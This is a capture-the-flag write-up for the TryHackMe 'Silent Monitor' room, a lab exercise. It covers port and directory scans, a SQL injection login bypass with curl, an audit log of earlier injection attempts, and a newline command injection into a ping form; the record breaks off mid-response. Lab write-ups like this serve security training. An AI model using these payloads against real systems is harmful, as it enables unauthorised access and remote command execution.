# [TryHackMe | Silent Monitor](https://tryhackme.com/room/silent-monitor) Challenge Room Solution Writeup

### What is the content of user.txt?

Begin by scanning `TARGET_IP` with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV -sC -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 54:dc:cf:ab:f7:ce:3a:89:6f:c0:b3:25:a6:02:e8:82 (ECDSA)
|_  256 10:30:ab:83:84:41:19:ec:e9:f9:0d:a1:ec:e9:cd:fa (ED25519)
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-title: CorpNet \xE2\x80\x94 Network Operations Centre
|_http-server-header: Werkzeug/2.0.2 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
```

Use `gobuster` to map out the directory structure of the `TARGET_IP` website. 

```yaml
root@ip-ATTACKER_IP:~# gobuster dir --url http://TARGET_IP:5050/ -w /usr/share/wordlists/dirb/big.txt -r -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP:5050/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/internal             (Status: 200) [Size: 8770]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
root@ip-ATTACKER_IP:~# gobuster dir --url http://TARGET_IP:5050/internal/ -w /usr/share/wordlists/dirb/big.txt -r -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP:5050/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 200) [Size: 8770]
/health               (Status: 200) [Size: 8770]
/logout               (Status: 200) [Size: 8770]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Inspect `http://TARGET_IP:5050/` to discover informtion about the operation.

```html
root@ip-ATTACKER_IP:~# curl -sX GET http://TARGET_IP:5050/ | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CorpNet — Network Operations Centre</title>
</head>
<body>

<header class="topbar">
  <div class="brand">
    <div class="brand-mark">
      <svg viewBox="0 0 16 16"><path d="M2 2h5v5H2zM9 2h5v5H9zM2 9h5v5H2zM11 9h2v2h2v2h-2v2h-2v-2H9v-2h2z"/></svg>
    </div>
    <div class="brand-name">CorpNet <span>Network Operations Centre</span></div>
  </div>
  <div class="topbar-right">
    <div class="status-pill">
      <span class="dot"></span>
      <span>ALL SYSTEMS NOMINAL</span>
    </div>
  </div>
</header>

<div class="hero">
  <div class="hero-inner">
    <div class="hero-tag">Infrastructure Monitoring</div>
    <h1><strong>Network Operations</strong><br>Centre Portal</h1>
    <p>Centralised infrastructure monitoring, host health verification, and operator audit logging for the CorpNet internal network.</p>
  </div>
</div>

<div class="strip"></div>

<div class="stats-bar">
  <div class="stat-item">
    <div class="stat-n">14</div>
    <div class="stat-l">Monitored Hosts</div>
  </div>
  <div class="stat-item">
    <div class="stat-n">3</div>
    <div class="stat-l">Open Alerts</div>
  </div>
  <div class="stat-item">
    <div class="stat-n">99.4%</div>
    <div class="stat-l">Uptime (30d)</div>
  </div>
  <div class="stat-item">
    <div class="stat-n">4</div>
    <div class="stat-l">Network Segments</div>
  </div>
</div>

<div class="cards-section">
  <div class="cards-title">Platform Capabilities</div>
  <div class="cards-grid">
    <div class="card">
      <div class="card-icon">
        <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm-.5 2v4l3 1.5-.5.9L7 9.5V5h.5z"/></svg>
      </div>
      <h3>Uptime Monitoring</h3>
      <p>Continuous ICMP and TCP service checks across all managed network segments with automated alerting on state changes.</p>
    </div>
    <div class="card">
      <div class="card-icon">
        <svg viewBox="0 0 16 16"><path d="M8 1l7 13H1L8 1zm0 3L3 12h10L8 4zm-.5 3h1v3h-1V7zm0 4h1v1.5h-1V11z"/></svg>
      </div>
      <h3>Incident Alerting</h3>
      <p>Threshold-based alert routing to on-call operators with escalation policies and suppression windows for planned maintenance.</p>
    </div>
    <div class="card">
      <div class="card-icon">
        <svg viewBox="0 0 16 16"><path d="M1 2h14v1H1zM1 5h10v1H1zM1 8h14v1H1zM1 11h10v1H1zM1 14h14v1H1z"/></svg>
      </div>
      <h3>Operator Audit Trail</h3>
      <p>All operator actions are logged with timestamp and session context. Audit records are retained for compliance and forensic review.</p>
    </div>
  </div>
</div>

<footer class="page-footer">
  <p>CORPNET INFRASTRUCTURE &nbsp;&mdash;&nbsp; INTERNAL USE ONLY &nbsp;&mdash;&nbsp; UNAUTHORISED ACCESS IS PROHIBITED</p>
  <div class="footer-mark">
    <span class="dot"></span>
    <span>NOC Portal v2.4.1</span>
  </div>
</footer>

</body>
</html>
```

Inspect `/internal` to discover a login page.

```html
root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP:5050/internal | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CorpNet NOC — Sign In</title>
</head>
<body>

<header class="topbar">
  <div class="brand">
    <div class="brand-mark">
      <svg viewBox="0 0 16 16"><path d="M2 2h5v5H2zM9 2h5v5H9zM2 9h5v5H2zM11 9h2v2h2v2h-2v2h-2v-2H9v-2h2z"/></svg>
    </div>
    <div class="brand-name">CorpNet <span>Network Operations Centre</span></div>
  </div>
  <div class="topbar-right">
    <div class="status-pill"><span class="dot"></span><span>SYSTEMS NOMINAL</span></div>
  </div>
</header>

<div class="page-body">
  <div class="login-wrap">
    <div class="login-eyebrow">Operator Access</div>
    <h1 class="login-title"><strong>Sign In</strong> to NOC Portal</h1>
    <p class="login-sub">Restricted to authorised personnel. All sessions are monitored and logged.</p>

    <div class="card">
      <div class="card-stripe"></div>
      <div class="card-body">

        

        <form method="POST" action="/internal" autocomplete="off">
          <div class="field">
            <label for="username">Username</label>
            <div class="input-wrap">
              <input type="text" id="username" name="username"
                     placeholder="operator id" autofocus
                     autocomplete="off" spellcheck="false">
              <svg viewBox="0 0 16 16"><path d="M8 8a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H3z"/></svg>
            </div>
          </div>
          <div class="field">
            <label for="password">Password</label>
            <div class="input-wrap">
              <input type="password" id="password" name="password"
                     placeholder="••••••••••••"
                     autocomplete="current-password">
              <svg viewBox="0 0 16 16"><path d="M11 6V5a3 3 0 00-6 0v1H3v8h10V6h-2zM7 5a1 1 0 012 0v1H7V5zm1 6a1 1 0 110-2 1 1 0 010 2z"/></svg>
            </div>
          </div>
          <button type="submit" class="btn-submit">
            <svg viewBox="0 0 16 16"><path d="M10 3h3v10h-3v-2H8v-1h2V6H8V5h2V3zM1 5h6v1H3v4h4v1H1V5z"/></svg>
            Authenticate
          </button>
        </form>

      </div>
      <div class="card-foot">
        <span class="foot-item">
          <svg viewBox="0 0 16 16"><path d="M8 1l6 3v4c0 3.5-2.5 6.5-6 7.5C2.5 14.5 0 11.5 0 8V4l8-3z"/></svg>
          Sec-Level: RESTRICTED
        </span>
        <span class="foot-item">
          <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm.5 7.5v3h-1v-3h1zm0-4v2h-1V4.5h1z"/></svg>
          Session timeout: 30 min
        </span>
        <span class="foot-item">v2.4.1</span>
      </div>
    </div>
  </div>
</div>

<footer class="page-footer">
  CORPNET INFRASTRUCTURE &nbsp;|&nbsp; INTERNAL USE ONLY &nbsp;|&nbsp; UNAUTHORISED ACCESS IS PROHIBITED
</footer>

</body>
</html>
```

There is no immediately apparent vulnerability to exploit. Perhaps the login page is vulnerable to Search Query Language inejction (SQLi).

```html
root@ip-ATTACKER_IP:~# curl -c cookies.txt -iX POST http://TARGET_IP:5050/internal --data-urlencode "username=' OR 1=1;-- -" --data-urlencode 'password=password'
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 244
Location: http://TARGET_IP:5050/internal/dashboard
Vary: Cookie
Set-Cookie: session=eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.avRd4w.8LjbHzZKSVQhGxoFK77h5UkJ7H4; HttpOnly; Path=/
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Wed, 11 Nov 2026 12:21:55 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/internal/dashboard">/internal/dashboard</a>. If not click the link.
```

Inspect `/internal/dashboard` with the saved session cookie to discover sensitive information. The SQLi login bypass authenticated the session as `username=netops` with `role=operator`. The dashboard's audit logs identify three users: `admin`, `jmartin`, and `netops`. The logs suggest that `netops` was previously targeted by a successful SQLi attack. Subsequent entries indicate a possible command injection attempt against `/internal/health`, using the payload `127.0.0.1%0awhoami`, where `%0a` represents a URL-encoded newline character.

```html
root@ip-ATTACKER_IP:~# curl -b cookies.txt -sX GET http://TARGET_IP:5050/internal/dashboard | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CorpNet NOC — Dashboard</title>
</head>
<body>

<header class="topbar">
  <a class="brand" href="/internal/dashboard">
    <div class="brand-mark"><svg viewBox="0 0 16 16"><path d="M2 2h5v5H2zM9 2h5v5H9zM2 9h5v5H2zM11 9h2v2h2v2h-2v2h-2v-2H9v-2h2z"/></svg></div>
    <div class="brand-name">CorpNet NOC</div>
  </a>
  <div class="topbar-divider"></div>
  <div class="breadcrumb">
    <span>Portal</span><span class="sep">/</span><span class="cur">Dashboard</span>
  </div>
  <div class="topbar-right">
    <div class="user-chip">
      <div class="user-avatar"><svg viewBox="0 0 16 16"><path d="M8 8a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H3z"/></svg></div>
      <span class="user-name">netops</span>
      <span class="user-role">operator</span>
    </div>
    <a href="/internal/logout" class="btn-out">
      <svg viewBox="0 0 16 16"><path d="M10 3h3v10h-3v-2H8v-1h2V6H8V5h2V3zM1 5h6v1H3v4h4v1H1V5z"/></svg>
      Sign Out
    </a>
  </div>
</header>

<div class="layout">
  <nav class="sidebar">
    <div class="sidebar-inner">
      <div class="nav-grp">
        <div class="nav-grp-lbl">Operations</div>
        <a href="/internal/dashboard" class="nav-a active">
          <svg viewBox="0 0 16 16"><path d="M1 1h6v6H1zM9 1h6v6H9zM1 9h6v6H1zM9 9h6v6H9z"/></svg>Overview
        </a>
        <a href="/internal/health" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm-.5 2v4l3 1.5-.5.9L7 9.5V5h.5z"/></svg>Host Health
          <span class="nav-badge">3</span>
        </a>
      </div>
      <div class="nav-div"></div>
      <div class="nav-grp">
        <div class="nav-grp-lbl">Monitoring</div>
        <a href="#audit" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M1 2h14v1H1zM1 5h10v1H1zM1 8h14v1H1zM1 11h10v1H1zM1 14h14v1H1z"/></svg>Audit Log
        </a>
        <a href="#services" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M2 4h12v8H2V4zm1 1v6h10V5H3z"/></svg>Services
        </a>
      </div>
      <div class="nav-div"></div>
      <div class="nav-grp">
        <div class="nav-grp-lbl">Account</div>
        <a href="/internal/logout" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M10 3h3v10h-3v-2H8v-1h2V6H8V5h2V3zM1 5h6v1H3v4h4v1H1V5z"/></svg>Sign Out
        </a>
      </div>
    </div>
    <div class="sidebar-foot">NOC Portal v2.4.1</div>
  </nav>

  <main class="main">
    <div class="page-hdr">
      <div><h2>System Overview</h2><p>Network Operations Centre &mdash; Live Infrastructure Status</p></div>
      <div class="refresh-ts">Last refresh: 2026-01-15 07:56:14</div>
    </div>

    <div class="stats">
      <div class="sc green">
        <div class="sc-ico"><svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm3.5 5.5l-4 4-2-2 1-1 1 1 3-3 1 1z"/></svg></div>
        <div class="sc-val">12</div><div class="sc-lbl">Hosts Online</div><div class="sc-sub">of 14 monitored</div>
      </div>
      <div class="sc red">
        <div class="sc-ico"><svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zM7 4h2v5H7V4zm0 6h2v2H7v-2z"/></svg></div>
        <div class="sc-val">2</div><div class="sc-lbl">Unreachable</div><div class="sc-sub">ICMP timeout</div>
      </div>
      <div class="sc orange">
        <div class="sc-ico"><svg viewBox="0 0 16 16"><path d="M8 1l7 13H1L8 1zm0 3L3 12h10L8 4zm-.5 3h1v3h-1V7zm0 4h1v1.5h-1V11z"/></svg></div>
        <div class="sc-val">3</div><div class="sc-lbl">Open Alerts</div><div class="sc-sub">1 critical, 2 warning</div>
      </div>
      <div class="sc blue">
        <div class="sc-ico"><svg viewBox="0 0 16 16"><path d="M1 2h14v12H1V2zm1 1v10h12V3H2zm2 2h8v1H4V5zm0 2h8v1H4V7zm0 2h5v1H4V9z"/></svg></div>
        <div class="sc-val">27</div><div class="sc-lbl">Log Entries</div><div class="sc-sub">displayed below</div>
      </div>
    </div>

    <div class="two-col" id="services">
      <div class="panel">
        <div class="ph"><div class="ph-l"><svg viewBox="0 0 16 16"><path d="M2 4h12v8H2V4zm1 1v6h10V5H3z"/></svg><span class="ph-t">Service Status</span></div><span class="badge bg-blue">LIVE</span></div>
        <div class="svc-list">
          <div class="svc-row"><div class="dot8 s-up"></div><span class="svc-n">SSH Daemon</span><span class="svc-a">0.0.0.0:22</span><span class="svc-ms">&lt;1ms</span></div>
          <div class="svc-row"><div class="dot8 s-up"></div><span class="svc-n">NOC API</span><span class="svc-a">0.0.0.0:5050</span><span class="svc-ms">2ms</span></div>
          <div class="svc-row"><div class="dot8 s-up"></div><span class="svc-n">SNMP Collector</span><span class="svc-a">127.0.0.1:161</span><span class="svc-ms">4ms</span></div>
          <div class="svc-row"><div class="dot8 s-warn"></div><span class="svc-n">Backup Agent</span><span class="svc-a">127.0.0.1:8812</span><span class="svc-ms">—</span></div>
          <div class="svc-row"><div class="dot8 s-down"></div><span class="svc-n">Syslog Collector</span><span class="svc-a">0.0.0.0:514</span><span class="svc-ms">timeout</span></div>
        </div>
      </div>
      <div class="panel">
        <div class="ph"><div class="ph-l"><svg viewBox="0 0 16 16"><path d="M1 5h14v6H1V5zm1 1v4h12V6H2z"/></svg><span class="ph-t">Network Segments</span></div><span class="badge bg-gray">4 segments</span></div>
        <div class="svc-list">
          <div class="svc-row"><div class="dot8 s-up"></div><span class="svc-n">Management</span><span class="svc-a">10.0.0.0/24</span><span class="svc-ms">12 hosts</span></div>
          <div class="svc-row"><div class="dot8 s-up"></div><span class="svc-n">Server VLAN</span><span class="svc-a">10.0.1.0/24</span><span class="svc-ms">8 hosts</span></div>
          <div class="svc-row"><div class="dot8 s-warn"></div><span class="svc-n">DMZ</span><span class="svc-a">10.0.2.0/24</span><span class="svc-ms">3 hosts</span></div>
          <div class="svc-row"><div class="dot8 s-up"></div><span class="svc-n">User VLAN</span><span class="svc-a">10.0.10.0/23</span><span class="svc-ms">47 hosts</span></div>
          <div class="svc-row"><div class="dot8 s-down"></div><span class="svc-n">OOB Management</span><span class="svc-a">192.168.100.0/24</span><span class="svc-ms">timeout</span></div>
        </div>
      </div>
    </div>

    <div class="panel" id="audit">
      <div class="ph"><div class="ph-l"><svg viewBox="0 0 16 16"><path d="M1 2h14v1H1zM1 5h10v1H1zM1 8h14v1H1zM1 11h10v1H1zM1 14h14v1H1z"/></svg><span class="ph-t">Audit Log</span></div><span class="badge bg-gray">27 entries</span></div>
      <div class="tbl-wrap">
        <table>
          <thead><tr><th>Timestamp</th><th>Operator</th><th>Event</th><th>Detail</th></tr></thead>
          <tbody>
            
            
            <tr>
              <td class="mono td-dim">2026-05-19 03:16:04</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">127.0.0.1%0awhoami</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-05-19 03:15:52</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">127.0.0.10%awhoami</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-05-19 03:15:39</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">127.0.0.1</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-05-19 03:15:05</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-green">LOGIN_OK</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-05-19 03:14:38</td>
              <td class="mono">&#39; OR 1=1#</td>
              <td>
                <span class="badge bg-red">LOGIN_ERROR</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-05-19 03:14:36</td>
              <td class="mono">&#39; OR 1=1#</td>
              <td>
                <span class="badge bg-red">LOGIN_ERROR</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-05-19 03:14:09</td>
              <td class="mono">admin&#39; --</td>
              <td>
                <span class="badge bg-red">LOGIN_FAIL</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 08:03:11</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-green">LOGIN_OK</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 08:04:02</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.1.4</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 08:04:28</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.1.7</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 08:31:55</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-gray">LOGOUT</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 09:17:40</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-green">LOGIN_OK</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 09:18:03</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.0.1</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 09:19:47</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.2.12</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 09:44:22</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-gray">LOGOUT</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 10:00:01</td>
              <td class="mono">svc-mon</td>
              <td>
                <span class="badge bg-green">LOGIN_OK</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 10:00:04</td>
              <td class="mono">svc-mon</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.1.1</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 10:00:07</td>
              <td class="mono">svc-mon</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.1.2</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 10:00:10</td>
              <td class="mono">svc-mon</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.1.3</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 10:00:13</td>
              <td class="mono">svc-mon</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.1.4</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 10:00:16</td>
              <td class="mono">svc-mon</td>
              <td>
                <span class="badge bg-gray">LOGOUT</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 11:02:38</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-red">LOGIN_FAIL</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 11:02:51</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-green">LOGIN_OK</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 11:03:14</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.2.5</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-14 11:28:07</td>
              <td class="mono">jmartin</td>
              <td>
                <span class="badge bg-gray">LOGOUT</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-15 07:55:30</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-green">LOGIN_OK</span>
                
              </td>
              <td class="td-dim">—</td>
            </tr>
            
            
            <tr>
              <td class="mono td-dim">2026-01-15 07:56:01</td>
              <td class="mono">netops</td>
              <td>
                <span class="badge bg-blue">HEALTH_CHECK</span>
                
              </td>
              <td class="td-dim">10.0.0.254</td>
            </tr>
            
            
          </tbody>
        </table>
      </div>
    </div>
  </main>
</div>
</body>
</html>
```

Inspect `/internal/health` to identify a potential newline-based command injection vulnerability in the `target` parameter of the connectivity verification form.

```html
root@ip-ATTACKER_IP:~# curl -b cookies.txt -sX GET http://TARGET_IP:5050/internal/health | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CorpNet NOC — Host Health</title>
</head>
<body>

<header class="topbar">
  <a class="brand" href="/internal/dashboard">
    <div class="brand-mark"><svg viewBox="0 0 16 16"><path d="M2 2h5v5H2zM9 2h5v5H9zM2 9h5v5H2zM11 9h2v2h2v2h-2v2h-2v-2H9v-2h2z"/></svg></div>
    <div class="brand-name">CorpNet NOC</div>
  </a>
  <div class="topbar-divider"></div>
  <div class="breadcrumb">
    <span>Portal</span><span class="sep">/</span><span>Dashboard</span><span class="sep">/</span><span class="cur">Host Health</span>
  </div>
  <div class="topbar-right">
    <div class="user-chip">
      <div class="user-avatar"><svg viewBox="0 0 16 16"><path d="M8 8a3 3 0 100-6 3 3 0 000 6zm-5 5a5 5 0 0110 0H3z"/></svg></div>
      <span class="user-name">netops</span>
      <span class="user-role">operator</span>
    </div>
    <a href="/internal/logout" class="btn-out">
      <svg viewBox="0 0 16 16"><path d="M10 3h3v10h-3v-2H8v-1h2V6H8V5h2V3zM1 5h6v1H3v4h4v1H1V5z"/></svg>Sign Out
    </a>
  </div>
</header>

<div class="layout">
  <nav class="sidebar">
    <div class="sidebar-inner">
      <div class="nav-grp">
        <div class="nav-grp-lbl">Operations</div>
        <a href="/internal/dashboard" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M1 1h6v6H1zM9 1h6v6H9zM1 9h6v6H1zM9 9h6v6H9z"/></svg>Overview
        </a>
        <a href="/internal/health" class="nav-a active">
          <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm-.5 2v4l3 1.5-.5.9L7 9.5V5h.5z"/></svg>Host Health
          <span class="nav-badge">3</span>
        </a>
      </div>
      <div class="nav-div"></div>
      <div class="nav-grp">
        <div class="nav-grp-lbl">Monitoring</div>
        <a href="/internal/dashboard#audit" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M1 2h14v1H1zM1 5h10v1H1zM1 8h14v1H1zM1 11h10v1H1zM1 14h14v1H1z"/></svg>Audit Log
        </a>
        <a href="/internal/dashboard#services" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M2 4h12v8H2V4zm1 1v6h10V5H3z"/></svg>Services
        </a>
      </div>
      <div class="nav-div"></div>
      <div class="nav-grp">
        <div class="nav-grp-lbl">Account</div>
        <a href="/internal/logout" class="nav-a">
          <svg viewBox="0 0 16 16"><path d="M10 3h3v10h-3v-2H8v-1h2V6H8V5h2V3zM1 5h6v1H3v4h4v1H1V5z"/></svg>Sign Out
        </a>
      </div>
    </div>
    <div class="sidebar-foot">NOC Portal v2.4.1</div>
  </nav>

  <main class="main">
    <div class="page-hdr">
      <h2>Host Health Check</h2>
      <p>ICMP reachability probe &mdash; verify connectivity to a target host or IP address</p>
    </div>

    <div class="panel">
      <div class="ph"><div class="ph-l"><svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm-.5 2v4l3 1.5-.5.9L7 9.5V5h.5z"/></svg><span class="ph-t">Connectivity Probe</span></div></div>
      <div class="panel-body">
        <div class="preset-row">
          <span class="preset-lbl">Quick:</span>
          <button class="preset-btn" onclick="setTarget('127.0.0.1')">127.0.0.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.0.1')">10.0.0.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.1.1')">10.0.1.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.2.1')">10.0.2.1</button>
          <button class="preset-btn" onclick="setTarget('10.0.10.1')">10.0.10.1</button>
        </div>
        <form method="POST" action="/internal/health">
          <div class="probe-form">
            <div class="field">
              <label class="field-lbl" for="target">Target Hostname or IP Address</label>
              <div class="input-wrap">
                <input type="text" id="target" name="target"
                       placeholder="hostname or x.x.x.x"
                       value=""
                       autocomplete="off" spellcheck="false">
                <svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3z"/></svg>
              </div>
              <div class="field-hint">IPv4 (e.g. 192.168.1.1) or hostname (e.g. server-01.corp.internal)</div>
            </div>
            <button type="submit" class="btn-run">
              <svg viewBox="0 0 16 16"><path d="M3 2l11 6-11 6V2z"/></svg>Run Probe
            </button>
          </div>
        </form>
        
        
      </div>
    </div>

    <div class="panel">
      <div class="ph"><div class="ph-l"><svg viewBox="0 0 16 16"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zM7 4h2v5H7V4zm0 6h2v2H7v-2z"/></svg><span class="ph-t">Usage Notes</span></div></div>
      <div class="notes-list">
        <div class="note-row">Sends 2 ICMP echo requests with a 1-second per-packet timeout</div>
        <div class="note-row">Accepts RFC-952 compliant hostnames and dotted-decimal IPv4 addresses</div>
        <div class="note-row">All probe targets are recorded in the operator audit log</div>
        <div class="note-row">ICMP traffic may be filtered by host-based firewalls on monitored nodes</div>
      </div>
    </div>
  </main>
</div>

<script>
function setTarget(v) { document.getElementById("target").value = v; }
</script>
</body>
</html>
```

Attempt this attack vector to discover that this executes as `username=www-data`.


```html
root@ip-ATTACKER_IP:~# curl -b cookies.txt -sX POST http://TARGET_IP:5050/internal/health --data-urlencode $'target=0.0.0.0\nwhoami' | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CorpNet NOC — Host Health</title>
</head>
<body>

<header class="topbar">
  <a class="brand" href="/internal/dashboard">
    <div class="brand-mark"><svg viewBox="0 0 16 16"><path d="M2 2h5v5H2zM9 2h5v5H9zM2 9h5v5H2zM11 9h2v2h2v2h-2v2h-2v-2H9v-2h2z"/></svg></div>
    <div class="brand-name">CorpNet NOC</div>
  </a>
  <div class="topbar-divider"></div>
  <div class="breadcrumb">
